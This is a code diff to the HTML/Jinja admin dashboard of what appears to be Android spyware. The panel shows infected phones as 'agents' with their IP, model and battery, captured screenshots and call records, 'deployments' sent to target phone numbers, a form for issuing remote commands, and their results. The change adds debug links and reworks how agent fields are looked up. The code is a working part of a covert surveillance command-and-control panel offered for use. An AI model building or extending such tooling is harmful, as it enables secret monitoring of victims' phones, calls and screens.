@@ -78,6 +78,11 @@
         .command-input { display: flex; gap: 10px; margin-top: 15px; }
         .command-input select, .command-input input { flex: 1; }
         
+        /* Debug Section */
+        .debug-section { background: #2d2d2d; padding: 15px; border-radius: 8px; margin: 15px 25px; border-left: 4px solid var(--warning); }
+        .debug-section a { color: #4CAF50; text-decoration: none; margin: 0 10px; }
+        .debug-section a:hover { text-decoration: underline; }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .nav { flex-direction: column; }
@@ -115,6 +120,16 @@
         <strong>Agents:</strong> {{ stats.active_agents }} Active
     </div>
 
+    <!-- Debug Section -->
+    <div class="debug-section">
+        <strong>🔧 Debug Tools:</strong> 
+        <a href="/debug/agents">View All Agents in DB</a> | 
+        <a href="/test/register_agent">Test Agent Registration</a> | 
+        <a href="/debug/fix_database">Fix Database Schema</a> |
+        <strong>Total Agents:</strong> {{ all_agents|length }} | 
+        <strong>Active Agents:</strong> {{ agents|length }}
+    </div>
+
     <!-- Statistics -->
     <div class="stats">
         <div class="stat-card">
@@ -146,32 +161,46 @@
         <div class="agent-grid">
             {% for agent in agents %}
             <div class="agent-card">
-                <h3>{{ agent['agent_id'] }}</h3>
-                <p><strong>Model:</strong> {{ agent['phone_model'] or 'Unknown' }}</p>
-                <p><strong>Android:</strong> {{ agent['android_version'] or 'Unknown' }}</p>
-                <p><strong>IP:</strong> {{ agent['ip_address'] or 'Unknown' }}</p>
-                <p><strong>First Seen:</strong> {{ agent['first_seen'] or 'Never' }}</p>
-                <p><strong>Last Seen:</strong> {{ agent['last_seen'] or 'Never' }}</p>
-                <p><strong>Screenshots:</strong> {{ agent['screenshot_count'] }}</p>
-                <p><strong>Calls:</strong> {{ agent['call_records'] }}</p>
+                <h3>{{ agent.agent_id }}</h3>
+                <p><strong>Model:</strong> {{ agent.phone_model or 'Unknown' }}</p>
+                <p><strong>Android:</strong> {{ agent.android_version or 'Unknown' }}</p>
+                <p><strong>IP:</strong> {{ agent.ip_address or 'Unknown' }}</p>
+                <p><strong>First Seen:</strong> {{ agent.first_seen or 'Never' }}</p>
+                <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
+                <p><strong>Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
+                <p><strong>Calls:</strong> {{ agent.call_records or 0 }}</p>
                 <p><strong>Battery:</strong> 
-                    {% if agent['battery_level'] %}
-                        {% if agent['battery_level'] > 70 %}🟢
-                        {% elif agent['battery_level'] > 30 %}🟡
+                    {% if agent.battery_level %}
+                        {% if agent.battery_level > 70 %}🟢
+                        {% elif agent.battery_level > 30 %}🟡
                         {% else %}🔴
                         {% endif %}
-                        {{ agent['battery_level'] }}%
+                        {{ agent.battery_level }}%
                     {% else %}Unknown{% endif %}
                 </p>
                 <div style="margin-top: 15px; display: flex; gap: 10px;">
-                    <a href="/admin/clear_agent/{{ agent['agent_id'] }}" class="btn btn-danger" 
-                       onclick="return confirm('Delete agent {{ agent['agent_id'] }}?')">🗑️ Remove</a>
+                    <a href="/admin/clear_agent/{{ agent.agent_id }}" class="btn btn-danger" 
+                       onclick="return confirm('Delete agent {{ agent.agent_id }}?')">🗑️ Remove</a>
                 </div>
             </div>
             {% endfor %}
         </div>
         {% else %}
-        <p style="text-align: center; padding: 40px; color: #888;">No active agents. Deploy agents to see them here!</p>
+        <div style="text-align: center; padding: 40px; color: #888;">
+            <p>No active agents. Deploy agents to see them here!</p>
+            {% if all_agents %}
+            <div style="margin-top: 20px;">
+                <h4>All Registered Agents (Inactive):</h4>
+                {% for agent in all_agents %}
+                <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px;">
+                    <strong>{{ agent.agent_id }}</strong> - 
+                    Status: <span class="status-{{ agent.status }}">{{ agent.status }}</span> - 
+                    Last: {{ agent.last_seen or 'Never' }}
+                </div>
+                {% endfor %}
+            </div>
+            {% endif %}
+        </div>
         {% endif %}
     </div>
 
@@ -182,14 +211,14 @@
         <div class="screenshot-grid">
             {% for screenshot in screenshots %}
             <div class="screenshot-item">
-                <a href="/media/screenshot/{{ screenshot['id'] }}" target="_blank">
-                    <img src="/media/screenshot/{{ screenshot['id'] }}" alt="Screenshot" class="screenshot-img"
+                <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
+                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Screenshot" class="screenshot-img"
                          onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDIwMCAxMjAiIGZpbGw9IiMzZDNkM2QiPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTIwIi8+PHRleHQgeD0iMTAwIiB5PSI2MCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0IiBmaWxsPSIjODg4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5TY3JlZW5zaG90IE5vdCBGb3VuZDwvdGV4dD48L3N2Zz4='">
                 </a>
                 <div style="margin-top: 10px;">
-                    <strong>{{ screenshot['agent_id'] }}</strong><br>
-                    <small>{{ screenshot['timestamp'] }}</small><br>
-                    <small>{{ screenshot['phone_model'] or 'Unknown Device' }}</small>
+                    <strong>{{ screenshot.agent_id }}</strong><br>
+                    <small>{{ screenshot.timestamp }}</small><br>
+                    <small>{{ screenshot.phone_model or 'Unknown Device' }}</small>
                 </div>
             </div>
             {% endfor %}
@@ -232,15 +261,15 @@
                 <tbody>
                     {% for deployment in deployments %}
                     <tr>
-                        <td>{{ deployment['target_phone'] }}</td>
-                        <td>{{ deployment['agent_id'] }}</td>
+                        <td>{{ deployment.target_phone }}</td>
+                        <td>{{ deployment.agent_id }}</td>
                         <td>
-                            <span class="status-{{ deployment['status'] }}">
-                                {{ deployment['status']|upper }}
+                            <span class="status-{{ deployment.status }}">
+                                {{ deployment.status|upper }}
                             </span>
                         </td>
-                        <td>{{ deployment['timestamp'] }}</td>
-                        <td><em>{{ deployment['message_sent'][:50] }}...</em></td>
+                        <td>{{ deployment.timestamp }}</td>
+                        <td><em>{{ deployment.message_sent[:50] }}...</em></td>
                     </tr>
                     {% endfor %}
                 </tbody>
@@ -255,15 +284,6 @@
     <div class="section" id="commands">
         <h2>⚡ Send Command</h2>
         
-        <!-- Debug Info -->
-        <div style="background: #2d2d2d; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #667eea;">
-            <strong>Debug Info:</strong> 
-            Total Agents in Database: {{ all_agents|length }} | 
-            Active Agents: {{ agents|length }} |
-            <a href="/debug/agents" style="color: #4CAF50;">View All Agents</a> |
-            <a href="/test/register_agent" style="color: #ff9800;">Test Registration</a>
-        </div>
-        
         <form action="/admin/command" method="post">
             <div class="form-group">
                 <label for="agent_id_cmd">Select Agent</label>
@@ -271,11 +291,11 @@
                     <option value="">-- Select Agent --</option>
                     {% if all_agents %}
                         {% for agent in all_agents %}
-                        <option value="{{ agent['agent_id'] }}">
-                            {{ agent['agent_id'] }} 
-                            ({{ agent['phone_model'] or 'Unknown' }}) 
-                            - {{ agent['status'] }}
-                            - Last: {{ agent['last_seen'] or 'Never' }}
+                        <option value="{{ agent.agent_id }}">
+                            {{ agent.agent_id }} 
+                            ({{ agent.phone_model or 'Unknown' }}) 
+                            - {{ agent.status }}
+                            - Last: {{ agent.last_seen or 'Never' }}
                         </option>
                         {% endfor %}
                     {% else %}
@@ -327,15 +347,15 @@
                 <tbody>
                     {% for command in commands %}
                     <tr>
-                        <td>{{ command['agent_id'] }}</td>
-                        <td><code>{{ command['command'] }}</code></td>
+                        <td>{{ command.agent_id }}</td>
+                        <td><code>{{ command.command }}</code></td>
                         <td>
-                            <span class="status-{{ command['status'] }}">
-                                {{ command['status']|upper }}
+                            <span class="status-{{ command.status }}">
+                                {{ command.status|upper }}
                             </span>
                         </td>
-                        <td>{{ command['timestamp'] }}</td>
-                        <td>{{ command['result'] or '--' }}</td>
+                        <td>{{ command.timestamp }}</td>
+                        <td>{{ command.result or '--' }}</td>
                     </tr>
                     {% endfor %}
                 </tbody>
@@ -354,13 +374,13 @@
             {% for log in logs %}
             <div>
                 <span style="color: 
-                    {% if log['level'] == 'ERROR' %}#ff4444
-                    {% elif log['level'] == 'WARNING' %}#ffaa00
+                    {% if log.level == 'ERROR' %}#ff4444
+                    {% elif log.level == 'WARNING' %}#ffaa00
                     {% else %}#00ff00
                     {% endif %}">
-                    [{{ log['timestamp'] }}] {{ log['level'] }}:
+                    [{{ log.timestamp }}] {{ log.level }}:
                 </span>
-                {{ log['message'] }}
+                {{ log.message }}
             </div>
             {% endfor %}
         </div>
